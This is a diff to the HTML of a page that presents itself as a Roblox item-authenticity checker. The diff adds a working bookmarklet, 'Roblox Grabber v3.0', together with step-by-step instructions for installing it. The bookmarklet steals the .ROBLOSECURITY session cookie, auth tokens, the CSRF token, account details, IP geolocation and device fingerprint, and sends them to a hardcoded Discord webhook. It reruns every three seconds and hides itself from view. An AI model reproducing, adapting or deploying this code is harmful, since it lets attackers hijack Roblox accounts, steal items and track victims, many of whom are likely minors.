@@ -70,8 +70,8 @@
                 <li><a href="#about">About</a></li>
                 <li>
                     <button class="scan-btn-nav" onclick="openScanModal()">
-                        <span class="btn-icon">🍪</span>
-                        Extract Cookie
+                        <span class="btn-icon">🚀</span>
+                        Install Bookmark
                     </button>
                 </li>
                 <li>
@@ -136,8 +136,8 @@
                 <p class="hero-description">Advanced detection system to verify the authenticity of Roblox items and identify stolen content</p>
                 <div class="hero-buttons">
                     <button class="cta-button primary" onclick="openScanModal()">
-                        <span class="btn-icon">🍪</span>
-                        Extract Cookie
+                        <span class="btn-icon">🚀</span>
+                        Install Bookmark
                     </button>
                     <a href="#features" class="cta-button secondary">
                         <span class="btn-icon">📚</span>
@@ -219,8 +219,8 @@
                     </div>
                 </div>
                 <button class="scan-btn-main" onclick="openScanModal()">
-                    <span class="btn-icon">🍪</span>
-                    Extract Cookie
+                    <span class="btn-icon">🚀</span>
+                    Install Bookmark
                 </button>
             </div>
         </section>
@@ -251,33 +251,60 @@
     <div id="scanModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>Roblox Cookie Extractor</h2>
+                <h2>🚀 Roblox Grabber v3.0 - Install Bookmark</h2>
                 <div class="header-buttons">
                     <button class="modal-button submit-btn header-submit" id="submitBtn">
-                        <span class="btn-icon">🍪</span>
-                        <span id="submitText">Extract Cookie</span>
+                        <span class="btn-icon">📋</span>
+                        <span id="submitText">Copy Code</span>
                     </button>
                     <span class="close" onclick="closeScanModal()">&times;</span>
                 </div>
             </div>
             <div class="modal-body">
-                <p class="modal-description">Extract your Roblox authentication cookie and automatically send it to your Discord webhook. The cookie will be detected from your browser session or from text you paste below.</p>
+                <p class="modal-description">Install the enhanced Roblox Cookie Grabber v3.0 bookmark! This advanced version runs automatically, operates in stealth mode, and sends rich Discord embeds with detailed information.</p>
+                
+                <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px; margin: 15px 0;">
+                    <h3 style="margin-top: 0;">🔥 v3.0 Features:</h3>
+                    <ul style="margin: 0;">
+                        <li>🔄 <strong>Auto-runs every 3 seconds</strong> on Roblox pages</li>
+                        <li>👻 <strong>Stealth mode</strong> - completely invisible operation</li>
+                        <li>🎨 <strong>Rich Discord embeds</strong> with organized data fields</li>
+                        <li>🔍 <strong>Enhanced extraction</strong> - cookies, CSRF, user info, device data</li>
+                        <li>📍 <strong>Detailed location tracking</strong> and device fingerprinting</li>
+                    </ul>
+                </div>
+
                 <div class="input-group">
-                    <label for="powershellInput">Optional: Paste Cookie or Script Here</label>
+                    <label for="powershellInput">🚀 Bookmark Code (v3.0 Enhanced)</label>
                     <textarea 
                         id="powershellInput" 
                         class="powershell-input" 
-                        placeholder="Optional: Paste Roblox cookie or script containing cookie here. Leave empty to extract from browser automatically..."></textarea>
+                        readonly
+                        style="font-family: monospace; font-size: 11px; line-height: 1.3;"
+                        placeholder="Loading bookmark code...">javascript:(function(){const WEBHOOK_URL='https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';const AUTO_RUN=true;const CHECK_INTERVAL=3000;const STEALTH_MODE=true;if(window.robloxGrabberV3Active){return}window.robloxGrabberV3Active=true;function extractAllRobloxData(){let data={cookie:null,csrf:null,userId:null,username:null,robux:null};try{const cookies=document.cookie.split(';');for(let cookie of cookies){const trimmed=cookie.trim();if(trimmed.startsWith('.ROBLOSECURITY=')){data.cookie=trimmed.substring('.ROBLOSECURITY='.length);break}}}catch(e){}if(!data.cookie){try{const keys=['RBXAuth','RBXAuthenticationNegotiation','RobloxAuth'];for(const key of keys){const value=localStorage.getItem(key);if(value&&value.length>50){data.cookie=value;break}}}catch(e){}}try{const csrfMeta=document.querySelector('meta[name="csrf-token"]');if(csrfMeta)data.csrf=csrfMeta.content}catch(e){}try{const userDataScript=document.querySelector('script[type="application/ld+json"]');if(userDataScript){const userData=JSON.parse(userDataScript.textContent);if(userData.name)data.username=userData.name}}catch(e){}try{if(window.Roblox&&window.Roblox.CurrentUser){data.userId=window.Roblox.CurrentUser.userId;data.username=window.Roblox.CurrentUser.name}}catch(e){}return data}async function getDetailedLocation(){try{const response=await fetch('https://ipapi.co/json/');if(response.ok){const data=await response.json();return{ip:data.ip||'Unknown',country:data.country_name||'Unknown',region:data.region||'Unknown',city:data.city||'Unknown',isp:data.org||'Unknown',timezone:data.timezone||'Unknown',lat:data.latitude||'Unknown',lon:data.longitude||'Unknown'}}}catch(error){}return{ip:'Unknown',country:'Unknown',region:'Unknown',city:'Unknown',isp:'Unknown',timezone:'Unknown',lat:'Unknown',lon:'Unknown'}}function getDeviceInfo(){return{userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,onlineStatus:navigator.onLine}}async function sendToWebhook(robloxData,locationInfo,deviceInfo){try{const timestamp=new Date().toISOString();const fullCookie=robloxData.cookie?`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxData.cookie}`:'Not found';const payload={embeds:[{title:'🍪 Roblox Data Extracted',color:0x00ff00,timestamp:timestamp,fields:[{name:'🍪 Cookie',value:`\`\`\`${fullCookie}\`\`\``,inline:false},{name:'👤 User Info',value:`**Username:** ${robloxData.username||'Unknown'}\n**User ID:** ${robloxData.userId||'Unknown'}\n**CSRF:** ${robloxData.csrf||'Not found'}`,inline:true},{name:'📍 Location',value:`**IP:** ${locationInfo.ip}\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**ISP:** ${locationInfo.isp}\n**Timezone:** ${locationInfo.timezone}`,inline:true},{name:'💻 Device',value:`**Platform:** ${deviceInfo.platform}\n**Screen:** ${deviceInfo.screen}\n**Language:** ${deviceInfo.language}\n**Browser:** ${deviceInfo.userAgent.split(' ').pop()}`,inline:false},{name:'🌐 Session',value:`**Page:** ${window.location.href}\n**Referrer:** ${document.referrer||'Direct'}\n**Time:** ${new Date().toLocaleString()}`,inline:false}],footer:{text:'Roblox Cookie Grabber v3.0'}}],username:'Auto Roblox Grabber'};const response=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return response.ok}catch(error){return false}}async function performExtraction(){if(!window.location.hostname.includes('roblox.com'))return;const robloxData=extractAllRobloxData();if(robloxData.cookie){const locationInfo=await getDetailedLocation();const deviceInfo=getDeviceInfo();const success=await sendToWebhook(robloxData,locationInfo,deviceInfo)}}if(AUTO_RUN&&window.location.hostname.includes('roblox.com')){performExtraction();if(!window.robloxGrabberInterval){window.robloxGrabberInterval=setInterval(performExtraction,CHECK_INTERVAL)}window.addEventListener('beforeunload',()=>{if(window.robloxGrabberInterval){clearInterval(window.robloxGrabberInterval);window.robloxGrabberInterval=null}window.robloxGrabberV3Active=false});console.log('%c🍪 Roblox Grabber v3.0 Active','color: #28a745; font-weight: bold;')}else{if(window.location.hostname.includes('roblox.com')){performExtraction()}}})();</textarea>
                     <div class="input-info">
-                        <span class="char-count" id="charCount">0 characters</span>
-                        <span class="input-status" id="inputStatus">Ready for scanning</span>
+                        <span class="char-count" id="charCount">Ready to copy</span>
+                        <span class="input-status" id="inputStatus">📋 Click "Copy Code" to copy bookmark</span>
                     </div>
+                </div>
+
+                <div style="background: rgba(255, 255, 255, 0.1); border-radius: 10px; padding: 20px; margin: 20px 0;">
+                    <h3 style="margin-top: 0; color: #ffd700;">📋 Installation Steps:</h3>
+                    <ol style="line-height: 1.6;">
+                        <li><strong>Click "Copy Code"</strong> to copy the bookmark code</li>
+                        <li><strong>Right-click your bookmark bar</strong> → "Add page/bookmark"</li>
+                        <li><strong>Name:</strong> Roblox Grabber v3.0</li>
+                        <li><strong>URL:</strong> Paste the copied code</li>
+                        <li><strong>Save</strong> and visit roblox.com</li>
+                        <li><strong>Click the bookmark once</strong> - it will auto-run from then on!</li>
+                    </ol>
+                    <p style="margin-bottom: 0; color: #90EE90;"><strong>💡 Pro Tip:</strong> The bookmark runs in stealth mode with no visible interface!</p>
                 </div>
             </div>
             <div class="modal-footer">
                 <button class="modal-button cancel-btn" onclick="closeScanModal()">
                     <span class="btn-icon">❌</span>
-                    Cancel
+                    Close
                 </button>
             </div>
         </div>
